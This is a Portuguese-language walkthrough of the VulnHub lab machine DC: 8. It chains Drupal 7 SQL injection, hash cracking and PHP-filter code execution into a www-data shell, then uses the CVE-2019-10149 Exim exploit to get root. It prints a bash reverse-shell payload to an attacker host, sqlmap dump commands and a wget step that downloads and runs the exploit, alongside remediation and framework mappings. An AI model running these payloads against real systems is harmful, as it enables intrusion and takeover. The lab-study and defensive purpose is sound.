# DC: 8 — SQLi para Exim: O Combo de Dois CVEs

DC: 8 entrega uma cadeia limpa de duas fases, mano. Primeira: injeção SQL no parâmetro `nid` do Drupal 7 que entrega a tabela de usuários com hashes de senha. Quebre o hash, faça login como john com a senha "turtle" (sem brincadeira, não foi a escolha mais forte), abuse o filtro de texto PHP para abrir uma shell como www-data. Depois a parte elegante: binário SUID Exim 4.89 sentado ali, vulnerável ao CVE-2019-10149 (Return of the WIZard), que entrega root. Dois CVEs, execução limpa, lições reais sobre hardening de CMS e privilégio de servidor de email.

| Campo | Valor |
|---|---|
| **Nível** | Médio |
| **VM Alvo** | DC: 8 |
| **VM Atacante** | Kali Linux |
| **URL VulnHub** | https://www.vulnhub.com/entry/dc-8,367/ |
| **Técnicas** | Injeção SQL (parâmetro nid Drupal), dump de banco via sqlmap, quebra de hash (John the Ripper), RCE via módulo PHP Filter Drupal, LPE SUID Exim 4.89 |
| **CVEs** | CVE-2019-10149 (Exim 4.89 escalação local de privilégios, "Return of the WIZard") |
| **Grupos APT** | APT41 (explora SQL injection em CMS para roubo de credenciais e RCE em aplicações web corporativas); OilRig/APT34 (usa vulnerabilidades de servidor de email incluindo LPE Exim para escalação de privilégios em hosts Linux comprometidos) |

---

## Resumo do Ataque

```
[netdiscover] → [nmap: porta 80 Drupal 7, porta 22 SSH]
    → [navegar: /?nid=1 → erro SQL em /?nid=1']
    → [sqlmap: d7db → tabela users → hash john]
    → [john --wordlist=rockyou.txt → john:turtle]
    → [login Drupal como john:turtle]
    → [Configuration → Text formats → Full HTML → habilitar PHP filter]
    → [editar conteúdo → formato PHP code → Bash TCP reverse shell]
    → [listener nc → shell como www-data]
    → [upgrade python3 pty]
    → [find SUID: /usr/sbin/exim4]
    → [exim --version → 4.89]
    → [wget raptor_exim_wiz.sh para /tmp]
    → [./raptor_exim_wiz.sh -m netcat → shell root]
    → [cat /root/flag.txt → FLAG]
```

---

## Metodologia

1. Descoberta de rede e varredura de portas (Nmap)
2. Reconhecimento web: Drupal 7, teste de parâmetros de URL para injeção
3. Identificação e exploração de SQL injection com sqlmap
4. Extração e quebra de hash com John the Ripper
5. Login Drupal e habilitação do filtro de texto PHP
6. PHP reverse shell via nó de conteúdo
7. Estabilização do shell
8. Enumeração de SUID e identificação da versão Exim
9. Exploração do CVE-2019-10149 com raptor_exim_wiz
10. Captura da flag root

---

## Passo 1 — Descoberta de Host e Varredura de Portas

```bash
netdiscover -r 192.168.1.0/24
```

Anote o IP do alvo. Scan agressivo completo:

```bash
nmap -A <IP_ALVO>
```

Output esperado:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.x (Debian)
80/tcp open  http    Apache httpd 2.4.x
| http-generator: Drupal 7
```

Achado principal: Drupal 7 na porta 80. O parâmetro `nid` em nós de conteúdo Drupal 7 é um ponto de entrada de SQL injection bem conhecido.

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede

---

## Passo 2 — Descoberta de SQL Injection

Acesse `http://<IP_ALVO>/`. Os links de navegação incluem parâmetros `?nid=`. Teste com aspas simples:

```
http://<IP_ALVO>/?nid=1'
```

Um erro de banco de dados Drupal é retornado:

```
PDOException: SQLSTATE[42000]: Syntax error or access violation
```

SQL injection confirmado. O parâmetro `nid` é passado diretamente para a query do banco sem sanitização.

**Por que isso importa no mundo real?** SQL injection em plataformas CMS ainda é um vetor de ataque top. O APT41 foi documentado explorando SQL injection do Drupal em intrusões de 2019 visando organizações de saúde e governo.

**MITRE ATT&CK:** T1190 — Exploração de Aplicação Pública

---

## Passo 3 — Enumeração de Banco com sqlmap

```bash
sqlmap -u "http://<IP_ALVO>/?nid=1" --dbs --risk 3 --level 5 --batch
```

O banco `d7db` é encontrado. Faça dump da tabela de usuários:

```bash
sqlmap -u "http://<IP_ALVO>/?nid=1" -D d7db -T users --dump --risk 3 --level 5 --batch
```

Dois hashes de senha são extraídos. Salve em um arquivo:

```bash
echo '$S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z' > hashes.txt
```

Quebre com John the Ripper:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

Resultado:

```
turtle           (john)
```

Credencial: `john:turtle`

**MITRE ATT&CK:** T1110.002 — Força Bruta: Quebra de Senha; T1005 — Dados do Sistema Local

---

## Passo 4 — Login Drupal e Habilitação do PHP Filter

Acesse `http://<IP_ALVO>/user` e faça login com `john:turtle`.

Habilite execução de PHP em formatos de texto:

1. Vá em **Configuration > Content authoring > Text formats**.
2. Edite o formato "Full HTML".
3. Em filtros de formato de texto, habilite o filtro **PHP evaluator**.
4. Salve a configuração.

**MITRE ATT&CK:** T1078 — Contas Válidas; T1505.003 — Componente de Software Servidor: Web Shell

---

## Passo 5 — PHP Reverse Shell via Nó de Conteúdo

Acesse qualquer nó de conteúdo existente e edite:

1. Mude o formato de texto para **PHP code**.
2. Substitua o corpo pelo payload PHP reverse shell:

```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'");
?>
```

Substitua `<LHOST>` pelo IP do Kali e `<LPORT>` pela porta do listener (ex: 4444).

Inicie listener na máquina atacante:

```bash
nc -lvnp 4444
```

Salve ou preview o nó. O PHP executa quando a página é renderizada, entregando uma shell `www-data`.

**MITRE ATT&CK:** T1059.004 — Interpretador de Comandos: Shell Unix

---

## Passo 6 — Estabilização do Shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
export SHELL=bash
```

Você agora é `www-data` com shell interativo estável.

---

## Passo 7 — Enumeração SUID e Verificação da Versão Exim

Enumere binários SUID:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Output interessante esperado:

```
/usr/sbin/exim4
```

Verifique a versão do Exim:

```bash
exim --version
# ou
/usr/sbin/exim4 --version
```

```
Exim version 4.89
```

Exim 4.89 é vulnerável ao CVE-2019-10149, conhecido como "Return of the WIZard." Quando o Exim roda como root (o que faz quando SUID), a vulnerabilidade explora a expansão `${run{...}}` no comando `MAIL FROM` para executar comandos arbitrários como root.

**Nota real:** CVE-2019-10149 foi descoberto pela Qualys em junho de 2019 e afeta todas as versões Exim de 4.87 a 4.91. O OilRig (APT34) foi documentado visando servidores de email Linux incluindo Exim para escalação de privilégios pós-exploração.

**MITRE ATT&CK:** T1083 — Descoberta de Arquivos e Diretórios; T1548.001 — Abuso de Mecanismo de Elevação: Setuid

---

## Passo 8 — Escalação via CVE-2019-10149 (raptor_exim_wiz)

Baixe o exploit para `/tmp` no alvo (a partir do shell www-data):

```bash
wget https://raw.githubusercontent.com/AV1080p/Hackthebox-Writeups/master/raptor_exim_wiz.sh \
  -O /tmp/raptor_exim_wiz.sh
chmod +x /tmp/raptor_exim_wiz.sh
```

Alternativa: hospedar na máquina atacante e wget de lá:

```bash
# No atacante (no diretório do exploit):
python3 -m http.server 8080

# No alvo:
wget http://<IP_ATACANTE>:8080/raptor_exim_wiz.sh -O /tmp/raptor_exim_wiz.sh
chmod +x /tmp/raptor_exim_wiz.sh
```

Inicie listener de shell root na máquina atacante:

```bash
nc -lvnp 9001
```

Execute o exploit no modo netcat:

```bash
/tmp/raptor_exim_wiz.sh -m netcat
```

O exploit envia um `MAIL FROM` manipulado com expansão `${run{...}}` para o processo Exim local. Quando o Exim SUID o processa, executa o comando embutido como root. Uma shell root se conecta de volta ao listener.

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
```

(☞ﾟヮﾟ)☞ Root via CVE-2019-10149. GG, rapaziada.

**MITRE ATT&CK:** T1068 — Exploração para Escalação de Privilégios

---

## Passo 9 — Flag Root

```bash
cat /root/flag.txt
```

---

## Flags, Hashes e Credenciais Capturados

| Tipo | Valor | Encontrado Em | Quebrado/Usado |
|---|---|---|---|
| Hash de senha Drupal | `$S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z` | dump sqlmap do d7db.users | John the Ripper → john:turtle |
| Credencial Drupal | john:turtle | Quebra de hash | Login admin Drupal |
| Usuário web shell | www-data | RCE via PHP Filter Drupal | Acesso à shell |
| Flag root | (conteúdo de `/root/flag.txt`) | `/root/flag.txt` | Lida como root via CVE-2019-10149 |

---

## Lições Aprendidas

| # | Achado | Relevância no Mundo Real | Lição Principal |
|---|---|---|---|
| 1 | SQL injection no parâmetro nid do Drupal | SQL injection em CMS está nos playbooks do APT41 desde 2017; instalações EOL Drupal 7 são encontradas consistentemente em redes corporativas | Manter plataformas CMS patcheadas; migrar do Drupal 7 EOL; usar regras WAF para padrões SQLi |
| 2 | Filtro de texto PHP habilita RCE via conteúdo | Qualquer recurso de execução PHP acessível a admin em CMS é equivalente a um webshell | Desabilitar filtros de texto PHP permanentemente; usar Twig para templates; auditar configurações de formato de texto CMS |
| 3 | Senha fraca "turtle" quebrada a partir de dump de hash | Hashes phpass salgados ainda caem a ataques de dicionário quando senhas fracas são usadas | Aplicar política de senha forte (12+ chars, misto, símbolos); usar integração HIBP para novas senhas |
| 4 | Exim 4.89 SUID vulnerável ao CVE-2019-10149 | CVE-2019-10149 foi ativamente explorado em campo; Exim é o MTA padrão no Debian/Ubuntu | Patchear Exim para ≥4.92; auditar binários SUID mensalmente; remover SUID de servidores de email que não precisam |
| 5 | Drupal 7 EOL | Drupal 7 atingiu EOL em janeiro de 2025; muitos sistemas permanecem sem patch | Aplicar política de ciclo de vida de software; rastrear datas de EOL; migrar para versões suportadas |

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | TTP ID |
|---|---|---|---|
| Reconhecimento | Descoberta | Descoberta de Serviços de Rede | T1046 |
| Acesso Inicial | Acesso Inicial | Exploração de Aplicação Pública | T1190 |
| Acesso a Credenciais | Acesso a Credenciais | Força Bruta: Quebra de Senha | T1110.002 |
| Acesso Inicial | Acesso Inicial | Contas Válidas | T1078 |
| Execução | Execução | Interpretador de Comandos: Shell Unix | T1059.004 |
| Persistência | Persistência | Componente de Software Servidor: Web Shell | T1505.003 |
| Coleta | Coleta | Dados do Sistema Local | T1005 |
| Descoberta | Descoberta | Descoberta de Arquivos e Diretórios | T1083 |
| Escalação de Privilégios | Escalação de Privilégios | Exploração para Escalação de Privilégios | T1068 |
| Escalação de Privilégios | Escalação de Privilégios | Abuso de Mecanismo de Elevação: Setuid | T1548.001 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Atualizar Drupal** do 7.x EOL para uma versão suportada; aplicar todos os patches de segurança imediatamente
2. **Parametrizar a query nid** — atualizações do core Drupal corrigem isso; para código customizado, usar prepared statements
3. **Desabilitar filtro de texto PHP permanentemente** em todas as configurações de formato de texto Drupal; usar Twig para templates
4. **Aplicar política de senha forte** para todas as contas CMS: mínimo 12 caracteres, misto, símbolos; integrar verificação HIBP
5. **Atualizar Exim para ≥4.92** para remediar CVE-2019-10149; remover SUID do Exim se entrega local como root não for necessária
6. **Restringir conexões de saída** do processo do servidor web com iptables/ufw: bloquear shells reversas inesperadas
7. **Rotacionar credenciais** da conta john e auditar todas as outras contas CMS para senhas fracas

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gestão de Ativos | Inventariar todas as versões CMS; rastrear datas EOL; auditar binários SUID |
| Proteger | Controle de Acesso | Aplicar senhas fortes; desabilitar filtro de texto PHP; restringir SUID Exim |
| Proteger | Segurança de Dados | Parametrizar queries de banco; prevenir SQL injection no nível do código |
| Detectar | Anomalias e Eventos | Alertar sobre erros de banco Drupal (indicadores SQLi); monitorar execuções SUID Exim via auditd |
| Responder | Planejamento de Resposta | Rotacionar todas as credenciais CMS; patchear Drupal e Exim; remover configuração de filtro PHP |
| Recuperar | Planejamento de Recuperação | Restaurar Drupal de backup limpo; auditar todas as contas CMS e configurações de formato de texto |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| SI-10 | Validação de Input | Parametrizar nid e todos os parâmetros URL Drupal; regras WAF para padrões SQLi |
| SI-2 | Remediação de Falhas | Patchear Drupal e Exim; aplicar política de ciclo de vida de software com rastreamento de EOL |
| AC-6 | Menor Privilégio | Remover SUID Exim se não necessário; restringir papéis admin CMS a usuários necessários |
| IA-5 | Gerenciamento de Autenticadores | Aplicar complexidade de senha; integração HIBP; rotação regular de senhas para contas privilegiadas |
| CM-7 | Menor Funcionalidade | Desabilitar filtro de texto PHP; remover SUID Exim; desabilitar módulos Drupal não utilizados |

### CISA KEV

CVE-2019-10149 (Exim "Return of the WIZard" escalação local de privilégios) foi adicionado ao catálogo CISA Known Exploited Vulnerabilities. A CISA determina que agências federais corrijam essa vulnerabilidade e recomenda fortemente que todas as organizações apliquem a correção.

### C2M2

| Domínio | Prática | MIL Alvo |
|---|---|---|
| Gestão de Vulnerabilidades e Ameaças (THREAT) | Patchear e Remediar Vulnerabilidades (Drupal EOL, CVE-2019-10149 Exim) | MIL3 |
| Gestão de Ativos, Mudanças e Configuração (ASSET) | Gerenciar Inventário de Ativos de TI (versões CMS, binários SUID) | MIL2 |
| Gestão de Identidade e Acesso (IAM) | Gerenciar Senhas e Credenciais (senhas CMS fortes; sem padrões fracos) | MIL2 |

### MITRE D3FEND

- **D3-SFA** (Análise de Funcionalidade de Software): detectar filtro de texto PHP habilitado em configurações de formato de texto CMS
- **D3-UAP** (Permissões de Conta de Usuário): restringir SUID Exim; aplicar menor privilégio para processo de servidor de email
- **D3-ACH** (Fortalecimento de Configuração de Aplicação): aplicar guias de hardening Drupal; desabilitar formatos de texto perigosos

---

## Considerações Finais

DC: 8 é uma ótima máquina de dois atos. O primeiro ato (SQLi para hash para login CMS) é uma cadeia clássica que aparece regularmente em avaliações reais contra instalações Drupal sem patch. O segundo ato (Exim 4.89 SUID para CVE-2019-10149) é um CVE legítimo com histórico real: foi ativamente explorado em campanhas logo após a divulgação, e o Exim é o MTA padrão em sistemas baseados em Debian, o que significa que aparece em mais servidores Linux do que a maioria dos admins percebe.

A combinação ensina uma mentalidade valiosa: quando você consegue uma shell de baixo privilégio, enumere cada binário SUID e cheque cada um contra bancos de dados de CVE antes de assumir que exploração manual é necessária. Às vezes um exploit público entrega root em segundos.

"Turtle" como senha de uma conta sysadmin é fr fr um problema, véi.

Thanks guys!! (❍ᴥ❍ʋ)
